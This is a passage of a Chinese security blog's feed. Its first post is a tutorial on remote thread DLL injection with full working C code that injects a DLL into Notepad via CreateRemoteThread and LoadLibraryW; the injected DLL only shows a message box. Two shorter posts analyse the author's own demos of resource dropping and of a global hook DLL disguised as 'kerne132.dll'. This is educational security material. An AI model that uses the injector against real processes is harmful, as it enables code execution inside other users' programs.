class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。</p><p>lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。</p><p>dwSize：要分配的内存大小，以字节为单位。</p><p>flAllocationType：内存分配类型。此参数必须为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT<BR>0x00001000</BR></td><td>在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</td></tr><tr><td>MEM_RESERVE<BR>0x00002000</BR></td><td>保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET<BR>0x00080000</BR></td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。</td></tr><tr><td>MEM_RESET_UNDO<BR>0x1000000</BR></td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><p>flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值：</p><ul><li>PAGE_NOACCESS</li><li>PAGE_GUARD</li><li>PAGE_NOCACHE</li><li>PAGE_WRITECOMBINE</li></ul><p>返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。</p><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><p>在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">  HANDLE  hProcess,</span><br><span class="line">  LPVOID  lpBaseAddress,</span><br><span class="line">  LPCVOID lpBuffer,</span><br><span class="line">  SIZE_T  nSize,</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。</p><p>lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。</p><p>lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。</p><p>nSize：要写入指定进程的字节数。</p><p>lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。</p><p>返回值：如果函数成功，则返回值不为0；如果失败，则为0；</p><h5 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h5><p>创建一个在另一个进程的虚拟地址空间中运行的线程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span><br><span class="line">  SIZE_T                 dwStackSize,</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">  LPVOID                 lpParameter,</span><br><span class="line">  DWORD                  dwCreationFlags,</span><br><span class="line">  LPDWORD                lpThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。</p><p>dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。</p><p>lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。</p><p>lpParameter：指向要传递给线程函数的变量的指针。</p><p>dwCreationFlags：控制线程创建的标志。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>线程在创建后立即运行</td></tr><tr><td>CREATE_SUSPENDED<BR></BR></td><td>该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行</td></tr><tr><td>STACK_SIZE_PARAM_IS_A_RESERVATION<BR></BR></td><td>所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。</td></tr></tbody></table><p>lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。</p><p>返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>RemoteThreadInject.cpp代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;processthreadsapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteThreadInject</span><span class="params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取注入进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = lstrlen(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//申请内存</span></span><br><span class="line">pDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向申请的内存写入数据</span></span><br><span class="line">BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (WriteFlag == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取loadlibrary</span></span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFuncProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;创建线程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">WaitForSingleObject(hRemoteThread, <span class="number">-1</span>);</span><br><span class="line">DWORD code;</span><br><span class="line">GetExitCodeThread(hRemoteThread, &amp;code);</span><br><span class="line">code = GetLastError();</span><br><span class="line">VirtualFreeEx(hProcess, pDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hRemoteThread);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按下回车开始注入\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">HWND hNotepadWindow = FindWindow(<span class="string">L&quot;Notepad&quot;</span>,<span class="string">L&quot;无标题 - 记事本&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hNotepadWindow == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID);</span><br><span class="line"><span class="keyword">if</span> (dwPID == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取PID失败\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="string">L&quot;C:\\Users\\Tophanter\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dllmain.cpp代码如下，主要实现一个弹窗功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;注入成功！&quot;</span>, <span class="string">L&quot;ok&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>开始注入，就可以看到已经成功弹出了窗口。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;远程线程注入&quot;&gt;&lt;a href=&quot;#远程线程注入&quot; class=&quot;headerlink&quot; title=&quot;远程线程注入&quot;&gt;&lt;/a&gt;远程线程注入&lt;/h4&gt;&lt;p&gt;远程线程注入是指一个进程在另一个进程中创建线程的技术。&lt;/p&gt;
&lt;h4 id=&quot;函数介绍&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>病毒分析-资源释放+钩子注入</title>
    <link href="https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-12T02:15:02.000Z</published>
    <updated>2021-07-12T03:52:12.644Z</updated>
    
    <content type="html"><![CDATA[<p>把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。</p><p>使用dir工具先查看一下基本信息，可以看到当前程序未加壳。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\Windows\SysWOW64\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><p>然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/5.png"></p><p>到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/7.png"></p><p>使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/8.png"></p><p>查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/9.png"></p><p>使用PC hunter工具可以很方便的查看是否存在钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。&lt;/p&gt;
&lt;p&gt;使用dir工具先查看一下基本信息，可以看到当前程序未加壳。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>病毒分析-资源释放</title>
    <link href="https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <id>https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</id>
    <published>2021-07-09T01:54:29.000Z</published>
    <updated>2021-07-12T02:15:39.146Z</updated>
    
    <content type="html"><![CDATA[<p>本篇来分析一下自己写的资源释放的小demo。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>打开程序，发现没有任何改变，没有明显的行为。</p><p>使用die工具查一下文件的基本信息</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><p>还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/4.png"></p><p>可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test”</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/5.png"></p><p>再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\Windows\System32下。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/6.png"></p><p>因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。</p><p>到路径下查找free.txt即可找到</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇来分析一下自己写的资源释放的小demo。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png&quot;&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
